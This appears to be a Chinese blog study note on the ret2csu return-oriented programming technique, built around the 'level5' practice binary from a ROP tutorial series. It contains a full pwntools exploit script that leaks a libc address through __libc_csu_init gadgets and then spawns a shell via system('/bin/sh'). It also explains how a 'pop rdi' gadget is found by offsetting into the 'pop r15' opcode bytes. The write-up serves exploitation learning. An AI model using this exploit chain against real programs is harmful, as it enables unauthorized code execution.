---
title: 中级ROP-ret2csu
date:  2020-08-11 08:15:43
updated: 2020-08-11 08:15:43
tags:
    - 中级ROP
    - wiki
    - pwn
    - ret2csu
categories: 
	- 二进制安全
	- wiki-pwn
use:
  - Valine
text: true
lazyload: true
count: true
---
# 1.查看

蒸米的一步一步学 ROP 之 linux_x64 篇中 level5 

![image.png](https://i.loli.net/2020/11/17/ITPvgBdYkDRjlEN.png)

# 2.ida分析

![image.png](https://i.loli.net/2020/11/17/W8wMjCnbUhDmTVO.png)

![image.png](https://i.loli.net/2020/11/17/aBqDTYkRXfUugoW.png)

# 3.编写脚本

```python
#!/usr/bin/env python
#coding=utf-8
from pwn import *
my_u64 = lambda x: u64(x.ljust(8, '\0'))
context.log_level = 'debug'
p=process('./level5')
elf=ELF('./level5')
libc = elf.libc

write_plt=elf.symbols['write']
write_got=elf.got['write']
vuln=elf.symbols['vulnerable_function']

pop6=0x40061A #pop rbx,pop rbp,pop r12,pop r13,pop r14,pop r15
mov=0x400600 #mov rdx, r13;mov rsi, r14;mov edi, r15d;call qword ptr [r12+rbx*8]

payload='a'*0x88
payload+=p64(pop6)
payload+=p64(0)+p64(1)+p64(write_got)+p64(8)+p64(write_got)+p64(1)
payload+=p64(mov)
payload+='a'*8*7    #平衡栈
payload+=p64(vuln)
p.recvuntil('Hello, World\n')
p.send(payload)

write=u64(p.recv(8))
print hex(write)

base=write-libc.symbols['write']
system=libc.symbols['system']+base
binsh=next(libc.search('/bin/sh'))+base

pop_rdi_ret=0x400623
payload='a'*0x88+p64(pop_rdi_ret)+p64(binsh)+p64(system)

p.send(payload)

p.interactive()
```

**pop_rdi_ret=0x400623**

**这个是怎么来的？ida里为什么没有？**

## 第一种方法：

直接ROPgadget找gadgets即可：

![image.png](https://i.loli.net/2020/11/17/l3eQt6JIwzNAmE2.png)

## 第二种方法：

我们看看csu_init的结尾几个pop的机器码：

![image.png](https://i.loli.net/2020/11/17/LBS3cpF8JI2zolf.png)

pop rbx--------->5B

pop rbp--------->5D

pop r12---------->41 5C

pop r13---------->41 5D

pop r14---------->41 5E

pop r15---------->41 5F

是不是感觉很有规律

其实原理就是这样

机器码就是有规律的，而这个规律我们在这可以巧妙地利用起来

查手册（或者od/ida之类的改一下机器码）得到5F是pop rdi

![image.png](https://i.loli.net/2020/11/17/aEC1X4AbgieMfJU.png)

那么看上面最后：

**0x400622 pop r15---------->41 5F
**

如果我们+1，就会变成

**0x400623 pop rdi---------->5F**

可以说就是凑出来的

其实这一段gedgets还能凑一些别的：
![image.png](https://i.loli.net/2020/11/17/NfDQvxZGM3mw492.png)